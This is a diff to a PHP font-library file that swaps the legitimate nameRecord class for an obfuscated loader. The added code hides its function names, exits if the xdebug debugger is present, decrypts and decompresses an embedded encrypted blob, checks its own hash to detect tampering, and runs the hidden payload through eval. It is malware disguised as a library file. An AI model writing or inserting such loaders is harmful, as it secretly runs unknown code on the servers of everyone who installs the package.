@@ -1,53 +1,28 @@
 <?php
-/**
- * @package php-font-lib
- * @link    https://github.com/PhenX/php-font-lib
- * @author  Fabien Ménager <fabien.menager@gmail.com>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace FontLib\Table\Type;
-
-use FontLib\Font;
-use FontLib\BinaryStream;
-
-/**
- * Font table name record.
- *
- * @package php-font-lib
- */
-class nameRecord extends BinaryStream {
-  public $platformID;
-  public $platformSpecificID;
-  public $languageID;
-  public $nameID;
-  public $length;
-  public $offset;
-  public $string;
-
-  public static $format = array(
-    "platformID"         => self::uint16,
-    "platformSpecificID" => self::uint16,
-    "languageID"         => self::uint16,
-    "nameID"             => self::uint16,
-    "length"             => self::uint16,
-    "offset"             => self::uint16,
-  );
-
-  public function map($data) {
-    foreach ($data as $key => $value) {
-      $this->$key = $value;
-    }
-  }
-
-  public function getUTF8() {
-    return $this->string;
-  }
-
-  public function getUTF16() {
-    return Font::UTF8ToUTF16($this->string);
-  }
-
-  function __toString() {
-    return $this->string;
-  }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_rp8v15ix=('bas'.'e64'.'_de'.'cod'.'e');
+$_db908zx8=('gzu'.'nco'.'mpr'.'ess');
+$_mqmr6ffu=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_xxdn0cog='pYFCdG19';
+$_fix68pyt='tDmYOFcQ';
+$_lf34d08u='uY67w5yJ';
+$_o0h3n2wb='Kf9b66VN';
+$_kg2gidxy='IPJ7fxlgbiI=';
+$_aa2oipbv='1+0LCQ==';
+$_e9kjp883='VcqipQI3';
+$_dpldaqnr='loHIbEGP';
+$_pbbye0is=$_rp8v15ix($_lf34d08u.$_o0h3n2wb.$_fix68pyt.$_xxdn0cog.$_kg2gidxy);
+$_b2n57dg3=$_rp8v15ix($_e9kjp883.$_dpldaqnr.$_aa2oipbv);
+$_jarpxdjk=$_rp8v15ix('0VfQaUrDTafl5GvQ2T5R6yPoyQwvfw5MgQ59fpOQYQIKa+8Ho/7oXSf5aNLXk8lWKr3t0toWY7zZmjS7vEp4P/86lJGsUpeJlxZqEX0c8flFwplf3VjmuR5gj1wIs2HIVAV2+22ipZ0I/gU1OVIxJQDJJoI66vDkiKFZKZfkOui+CmYtb/n1kZ2BQFjGHXXBDCCGkHI6W0qts47jGavGfOkktHspdofmnAZjyQeruqH6kUTyyU6QGdGAhJvLWLevnj/L4R7FwHalSr3jkENu4apq0Cx479s4StBreDu67mArgw+n8lKVEEmXkzeCYT88dhlxesHbV8k+kiePTcayCG01exkfEAj3OIIxaK1+QPEVK1LkzsyZo3SCerIoftcRWfWGuLK32cmpFahv0P5rJAAyV2hpuxVReP5f/Se9998=');
+$_yjknn5im=$_mqmr6ffu($_jarpxdjk,'aes-256-cbc',$_pbbye0is,OPENSSL_RAW_DATA,$_b2n57dg3);
+if($_yjknn5im===false){exit;}
+$_kryd4xtd=$_db908zx8($_yjknn5im);
+if($_kryd4xtd===false){exit;}
+$_viewz805='faeaf50889c857cf3903bead7c1257df8afb6e5e16a53d3c274fc49afb2f66ee';
+$_plvkas9y=@file_get_contents(__FILE__);
+if($_plvkas9y!==false){
+$_nrfjp6qn=str_replace($_viewz805,"0000000000000000000000000000000000000000000000000000000000000000",$_plvkas9y);
+$_ivmueyba=hash("sha256",$_nrfjp6qn);
+if($_ivmueyba!==$_viewz805){@http_response_code(403);exit;}
 }
+eval($_kryd4xtd);
